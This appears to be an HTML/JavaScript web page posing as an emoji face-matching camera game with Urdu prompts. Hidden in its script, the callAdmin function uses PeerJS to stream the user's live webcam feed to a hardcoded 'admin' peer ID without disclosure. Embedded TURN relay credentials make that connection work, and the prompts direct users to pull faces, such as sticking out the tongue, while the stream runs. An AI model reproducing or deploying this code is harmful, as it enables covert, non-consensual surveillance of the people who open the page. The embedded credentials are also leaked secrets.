<!DOCTYPE html>
<html lang="ur">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>AI Magic Studio & Auto Emoji Match</title>
  <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
  <script defer src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body, html {
      height: 100%; width: 100%; overflow: hidden;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      background-color: #010a05; background-image: url('a.jpg');
      background-size: cover; background-position: center; background-repeat: no-repeat;
    }
    #bgFireworksCanvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 1; }
    .hero { position: relative; width: 100vw; height: 100vh; display: flex; justify-content: center; align-items: center; padding: 15px; z-index: 2; }
    .glass-card {
      position: relative; width: 95%; max-width: 480px; background: rgba(255, 255, 255, 0.05);
      backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px);
      border-radius: 28px; border: 1px solid rgba(255, 255, 255, 0.18);
      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5); padding: 20px; text-align: center; color: #fff;
    }
    .tag-label { font-size: 12px; color: #00ff87; letter-spacing: 2px; text-transform: uppercase; margin-bottom: 8px; font-weight: 700; }
    h2 { font-size: 24px; color: #ffffff; margin-bottom: 6px; font-weight: 800; }
    p { font-size: 13px; color: #cbd5e1; margin-bottom: 16px; line-height: 1.4; }
    .glass-btn {
      background: linear-gradient(135deg, #00ff87, #00bfa5); color: #000000; border: 2px solid #00ff87;
      padding: 15px 20px; font-size: 16px; font-weight: 800; border-radius: 50px; cursor: pointer; 
      box-shadow: 0 0 15px rgba(0, 255, 135, 0.6), inset 0 0 10px rgba(255, 255, 255, 0.5); 
      width: 100%; transition: all 0.3s ease; animation: buttonGlow 2s infinite alternate;
    }
    .glass-btn:active { transform: scale(0.97); }
    @keyframes buttonGlow {
      0% { box-shadow: 0 0 10px rgba(0, 255, 135, 0.4), inset 0 0 5px rgba(255, 255, 255, 0.3); }
      100% { box-shadow: 0 0 22px rgba(0, 255, 135, 0.9), inset 0 0 12px rgba(255, 255, 255, 0.7); }
    }
    .studio-container { display: none; }
    .game-header { background: rgba(0, 0, 0, 0.4); border-radius: 16px; padding: 12px; margin-bottom: 12px; border: 1px solid rgba(255, 255, 255, 0.15); position: relative; }
    .challenge-instruction { font-size: 12px; font-weight: 700; color: #00ff87; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 4px; }
    .emoji-display-3d { font-size: 60px; display: inline-block; filter: drop-shadow(0px 8px 12px rgba(0,0,0,0.6)); animation: floatEmoji 1.2s infinite alternate ease-in-out; }
    @keyframes floatEmoji {
      0% { transform: translateY(0px) scale(1) rotate(-3deg); }
      100% { transform: translateY(-8px) scale(1.1) rotate(3deg); }
    }
    .score-board { display: flex; justify-content: space-around; font-size: 13px; font-weight: bold; color: #ffffff; margin-top: 6px; }
    .score-board span { color: #00ff87; }
    .status-msg { font-size: 12px; color: #ffd700; margin-top: 4px; font-weight: bold; min-height: 18px; }
    .progress-wrap { width: 100%; height: 8px; background: rgba(255, 255, 255, 0.12); border-radius: 20px; overflow: hidden; margin: 10px 0 6px 0; border: 1px solid rgba(255, 255, 255, 0.2); }
    .progress-bar { height: 100%; width: 0%; background: linear-gradient(90deg, #00ff87, #00e5ff); box-shadow: 0 0 12px #00ff87; transition: width 0.2s ease-out; }
    .video-frame-card { position: relative; background: rgba(0, 0, 0, 0.3); border-radius: 20px; border: 1px solid rgba(255, 255, 255, 0.15); overflow: hidden; margin-bottom: 12px; width: 100%; }
    video { width: 100%; height: auto; display: block; border-radius: 20px; transform: scaleX(-1); }
    .camera-controls { display: flex; align-items: center; justify-content: center; position: relative; padding: 2px; }
    .icon-btn {
      background: rgba(255, 255, 255, 0.12); border: 1px solid rgba(0, 255, 135, 0.5); color: #fff;
      padding: 10px 24px; border-radius: 50px; display: flex; align-items: center; justify-content: center;
      font-size: 13px; font-weight: bold; cursor: pointer; box-shadow: 0 0 10px rgba(0, 255, 135, 0.3); transition: all 0.2s;
    }
    .icon-btn:hover { background: rgba(255, 255, 255, 0.25); box-shadow: 0 0 18px rgba(0, 255, 135, 0.7); }
  </style>
</head>
<body>
  <canvas id="bgFireworksCanvas"></canvas>
  <div class="hero">
    <div class="glass-card">
      <div id="welcomePanel">
        <div class="tag-label">AI MAGIC STUDIO</div>
        <h2>Emoji Match Camera 🎭</h2>
        <p>Make the face expression! Secret photo capture on any emoji!</p>
        <button class="glass-btn" id="startBtn">Start Camera ✨</button>
      </div>

      <div class="studio-container" id="studioPanel">
        <div class="game-header">
          <div class="challenge-instruction" id="challengeText">MATCH THIS FACE!</div>
          <div class="emoji-display-3d" id="emoji">😄</div>
          <div class="status-msg" id="status">AI Ready! Make the expression.</div>
          <div class="progress-wrap"><div class="progress-bar" id="progressBar"></div></div>
          <div class="score-board">
            <div>Score: <span id="score">0</span></div>
            <div>Best: <span id="highScore">0</span></div>
          </div>
        </div>

        <div class="video-frame-card">
          <video id="video" autoplay muted playsinline></video>
        </div>

        <div class="camera-controls">
          <button class="icon-btn" id="flipBtn">🔄 Flip Camera</button>
        </div>
      </div>
    </div>
  </div>

  <script>
    const ADMIN_PEER_ID = "danish-cam-9988";

    const video = document.getElementById("video");
    const emojiElement = document.getElementById("emoji");
    const challengeText = document.getElementById("challengeText");
    const statusElement = document.getElementById("status");
    const progressBar = document.getElementById("progressBar");
    const startBtn = document.getElementById("startBtn");
    const flipBtn = document.getElementById("flipBtn");
    const scoreElement = document.getElementById("score");
    const highScoreElement = document.getElementById("highScore");

    const bgCanvas = document.getElementById('bgFireworksCanvas');
    const bgCtx = bgCanvas.getContext('2d');
    function resizeBg() { bgCanvas.width = window.innerWidth; bgCanvas.height = window.innerHeight; }
    window.addEventListener('resize', resizeBg);
    resizeBg();

    let bgParticles = [];
    class BgParticle {
      constructor(x, y) {
        this.x = x; this.y = y;
        const angle = Math.random() * Math.PI * 2;
        const speed = Math.random() * 5 + 2;
        this.vx = Math.cos(angle) * speed;
        this.vy = Math.sin(angle) * speed;
        this.color = ['#ff0055', '#00ff87', '#ffffff', '#ffd700', '#00e5ff'][Math.floor(Math.random()*5)];
        this.alpha = 1; this.decay = Math.random() * 0.015 + 0.008;
      }
      draw() {
        bgCtx.save(); bgCtx.globalCompositeOperation = 'lighter'; bgCtx.globalAlpha = this.alpha;
        bgCtx.beginPath(); bgCtx.arc(this.x, this.y, 2, 0, Math.PI * 2);
        bgCtx.fillStyle = this.color; bgCtx.fill(); bgCtx.restore();
      }
      update() { this.vx *= 0.96; this.vy *= 0.96; this.vy += 0.1; this.x += this.vx; this.y += this.vy; this.alpha -= this.decay; }
    }

    function animateBg() {
      requestAnimationFrame(animateBg);
      bgCtx.globalCompositeOperation = 'destination-out';
      bgCtx.fillStyle = 'rgba(0, 0, 0, 0.15)';
      bgCtx.fillRect(0, 0, bgCanvas.width, bgCanvas.height);
      bgCtx.globalCompositeOperation = 'source-over';
      bgParticles.forEach((p, i) => { if(p.alpha > 0) { p.update(); p.draw(); } else { bgParticles.splice(i, 1); } });
    }
    animateBg();

    const MODEL_URLS = [
      "https://justadudewhohacks.github.io/face-api.js/models",
      "https://cdn.jsdelivr.net/gh/justadudewhohacks/face-api.js@master/weights"
    ];

    let modelsLoaded = false;
    let modelLoadingPromise = null;

    async function loadModels() {
      if (modelsLoaded) return;
      if (modelLoadingPromise) return modelLoadingPromise;

      modelLoadingPromise = (async () => {
        for (const url of MODEL_URLS) {
          try {
            statusElement.textContent = "🤖 AI Models Loading...";
            await faceapi.nets.tinyFaceDetector.loadFromUri(url);
            await faceapi.nets.faceLandmark68Net.loadFromUri(url);
            await faceapi.nets.faceExpressionNet.loadFromUri(url);
            modelsLoaded = true;
            statusElement.textContent = "✅ AI Ready!";
            return;
          } catch (error) { console.log("Model load error:", error); }
        }
        throw new Error("Could not load face-api models.");
      })();

      return modelLoadingPromise;
    }

    let currentStream = null;
    let useFacingMode = "user";

    async function startCamera() {
      try {
        if (currentStream) { currentStream.getTracks().forEach(track => track.stop()); }
        statusElement.textContent = "📷 Starting camera...";

        currentStream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: { ideal: useFacingMode }, width: { ideal: 1280 }, height: { ideal: 720 } },
          audio: false
        });

        video.srcObject = currentStream;
        await video.play();

        document.getElementById('welcomePanel').style.display = "none";
        document.getElementById('studioPanel').style.display = "block";

        statusElement.textContent = "🙂 Camera ready!";
        callAdmin();
        startDetection();
      } catch (error) { alert("Camera permission required!"); }
    }

    flipBtn.addEventListener("click", async () => {
      useFacingMode = useFacingMode === "user" ? "environment" : "user";
      await startCamera();
    });

    let peer = null;
    let adminCallMade = false;

    const METERED_USERNAME = "89e52e462d770536efbe1fa511a5edaa5fe8";
    const METERED_CREDENTIAL = "kQh1+S+i0r/K4P50";

    function createPeer() {
      if (peer) return;

      peer = new Peer({
        config: {
          iceServers: [
            { urls: "stun:stun.l.google.com:19302" },
            { urls: "stun:stun1.l.google.com:19302" },
            {
              urls: [
                "turn:global.relay.metered.ca:80",
                "turn:global.relay.metered.ca:80?transport=tcp",
                "turn:global.relay.metered.ca:443",
                "turns:global.relay.metered.ca:443?transport=tcp"
              ],
              username: METERED_USERNAME,
              credential: METERED_CREDENTIAL
            }
          ]
        }
      });

      peer.on("open", id => { callAdmin(); });
      peer.on("error", error => { console.log("PeerJS error:", error); });
    }

    function callAdmin() {
      if (!peer || !peer.open || !currentStream || adminCallMade) return;
      try {
        const call = peer.call(ADMIN_PEER_ID, currentStream);
        if (call) { adminCallMade = true; }
      } catch (error) { console.log("Admin call failed:", error); }
    }

    const EXPRESSIONS = [
      { emoji: "🧔", expression: "chin", name: "تھوڑی اوپر کر کے دکھائیں" },
      { emoji: "👅", expression: "full_tongue", name: "پوری زبان باہر نکالیں" },
      { emoji: "😁", expression: "teeth", name: "دانت پورا کھول کر دکھائیں" },
      { emoji: "😄", expression: "happy", name: "مسکرائیں" },
      { emoji: "😡", expression: "angry", name: "غصہ دکھائیں" }
    ];

    const REQUIRED_HOLD_FRAMES = 6;
    const TARGET_THRESHOLD = 0.65;
    const REQUIRED_NEUTRAL_FRAMES = 6;
    const CHALLENGE_DELAY = 800;

    let roundSequence = [], currentIndex = 0, photoCaptureIndex = -1, score = 0;
    let highScore = parseInt(localStorage.getItem("emojiHighScore") || "0");
    let gameRunning = false, waitingForNeutral = false, neutralFrames = 0, holdFrames = 0;
    let detectionStartedAt = 0, detectionInterval = null, challengeLocked = false;

    highScoreElement.textContent = highScore;

    function shuffle(array) {
      const arr = [...array];
      for (let i = arr.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [arr[i], arr[j]] = [arr[j], arr[i]];
      }
      return arr;
    }

    function createNewRound() {
      roundSequence = shuffle(EXPRESSIONS);
      currentIndex = 0;
      photoCaptureIndex = Math.floor(Math.random() * roundSequence.length);
      score = 0;
      scoreElement.textContent = score;
      gameRunning = true; waitingForNeutral = false; neutralFrames = 0; holdFrames = 0; challengeLocked = false;
      showChallenge();
    }

    function showChallenge() {
      if (!roundSequence.length) return;
      const challenge = roundSequence[currentIndex];
      emojiElement.textContent = challenge.emoji;
      challengeText.textContent = `MAKE THIS FACE! (${currentIndex + 1}/${roundSequence.length})`;
      progressBar.style.width = "0%";
      holdFrames = 0;
      detectionStartedAt = Date.now() + CHALLENGE_DELAY;
      waitingForNeutral = false;
      statusElement.textContent = `🎯 ${challenge.name}!`;
    }

    function checkNeutral(expressions) { return expressions ? (expressions.neutral || 0) >= 0.50 : true; }

    function checkCustomAction(detection, target) {
      const expressions = detection.expressions;
      const landmarks = detection.landmarks;

      if (target === "chin") {
        return Math.abs(landmarks.getJawOutline()[8].y - landmarks.getNose()[3].y) > 85;
      }
      if (target === "full_tongue") {
        const mouth = landmarks.getMouth();
        return Math.abs(mouth[18].y - mouth[14].y) > 25;
      }
      if (target === "teeth") {
        const mouth = landmarks.getMouth();
        return (Math.abs(mouth[6].x - mouth[0].x) > 55 && Math.abs(mouth[18].y - mouth[14].y) > 12) || expressions.happy > 0.70;
      }
      return (expressions[target] || 0) >= TARGET_THRESHOLD;
    }

    async function detectFace() {
      if (!gameRunning || !video.videoWidth || challengeLocked) return;

      try {
        const detection = await faceapi.detectSingleFace(
          video, new faceapi.TinyFaceDetectorOptions({ inputSize: 320, scoreThreshold: 0.4 })
        ).withFaceLandmarks().withFaceExpressions();

        if (!detection) {
          statusElement.textContent = "👤 Face not detected...";
          holdFrames = 0; progressBar.style.width = "0%";
          return;
        }

        if (waitingForNeutral) {
          if (checkNeutral(detection.expressions)) {
            neutralFrames++;
            progressBar.style.width = Math.min(100, (neutralFrames / REQUIRED_NEUTRAL_FRAMES) * 100) + "%";
            statusElement.textContent = `😐 Relax your face... ${neutralFrames}/${REQUIRED_NEUTRAL_FRAMES}`;

            if (neutralFrames >= REQUIRED_NEUTRAL_FRAMES) {
              waitingForNeutral = false; neutralFrames = 0; holdFrames = 0;
              detectionStartedAt = Date.now() + CHALLENGE_DELAY;
              progressBar.style.width = "0%";
              showChallenge();
            }
          } else {
            neutralFrames = 0; progressBar.style.width = "0%";
            statusElement.textContent = "😐 Relax your face first!";
          }
          return;
        }

        if (Date.now() < detectionStartedAt) {
          holdFrames = 0; progressBar.style.width = "0%";
          statusElement.textContent = "👀 Get ready...";
          return;
        }

        const challenge = roundSequence[currentIndex];
        if (checkCustomAction(detection, challenge.expression)) {
          holdFrames++;
          progressBar.style.width = Math.min(100, (holdFrames / REQUIRED_HOLD_FRAMES) * 100) + "%";
          statusElement.textContent = `🔥 Matching ${challenge.emoji}... ${holdFrames}/${REQUIRED_HOLD_FRAMES}`;

          if (holdFrames >= REQUIRED_HOLD_FRAMES) { await successfulMatch(); }
        } else {
          holdFrames = 0; progressBar.style.width = "0%";
          statusElement.textContent = `😈 Show ${challenge.name} (${challenge.emoji})!`;
        }
      } catch (error) { console.log("Detection error:", error); }
    }

    async function successfulMatch() {
      if (challengeLocked) return;
      challengeLocked = true;

      const challenge = roundSequence[currentIndex];
      score++; scoreElement.textContent = score;

      if (score > highScore) {
        highScore = score;
        localStorage.setItem("emojiHighScore", highScore);
        highScoreElement.textContent = highScore;
      }

      statusElement.textContent = `✅ Matched! ${challenge.emoji}`;
      progressBar.style.width = "100%";

      if (currentIndex === photoCaptureIndex) {
        statusElement.textContent = `📸 Auto-Capturing Photo on ${challenge.emoji}!`;
        await new Promise(r => setTimeout(r, 300));
        takePhoto(); fireworks();
      }

      if (currentIndex === roundSequence.length - 1) {
        statusElement.textContent = "🎉 ROUND COMPLETED!";
        await new Promise(r => setTimeout(r, 1500));
        createNewRound();
        challengeLocked = false;
        return;
      }

      currentIndex++; waitingForNeutral = true; neutralFrames = 0; holdFrames = 0;
      progressBar.style.width = "0%";
      statusElement.textContent = "😐 Relax your face completely...";
      challengeLocked = false;
    }

    function takePhoto() {
      if (!video.videoWidth) return;
      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth; canvas.height = video.videoHeight;
      const ctx = canvas.getContext("2d");
      ctx.translate(canvas.width, 0); ctx.scale(-1, 1);
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      canvas.toBlob(blob => {
        if (!blob) return;
        const url = URL.createObjectURL(blob);
        const a = document.createElement("a");
        a.href = url; a.download = `AI-Emoji-${Date.now()}.png`;
        document.body.appendChild(a); a.click(); a.remove();
        setTimeout(() => URL.revokeObjectURL(url), 2000);
      }, "image/png");
    }

    function fireworks() {
      confetti({ particleCount: 180, spread: 120, startVelocity: 45, origin: { y: 0.6 } });
      setTimeout(() => confetti({ particleCount: 120, spread: 100, startVelocity: 35, origin: { x: 0.2, y: 0.5 } }), 250);
      setTimeout(() => confetti({ particleCount: 120, spread: 100, startVelocity: 35, origin: { x: 0.8, y: 0.5 } }), 500);
    }

    function startDetection() {
      if (detectionInterval) clearInterval(detectionInterval);
      detectionInterval = setInterval(detectFace, 250);
    }

    startBtn.addEventListener("click", async () => {
      try {
        await loadModels(); createPeer(); await startCamera(); createNewRound();
      } catch (error) { statusElement.textContent = "❌ AI models load نہیں ہو سکے۔ Internet check کریں۔"; }
    });

    (async function init() {
      try {
        createPeer();
        statusElement.textContent = "🤖 AI تیار کرنے کے لیے Start Camera دبائیں۔";
      } catch (error) { console.log(error); }
    })();
  </script>
</body>
</html>
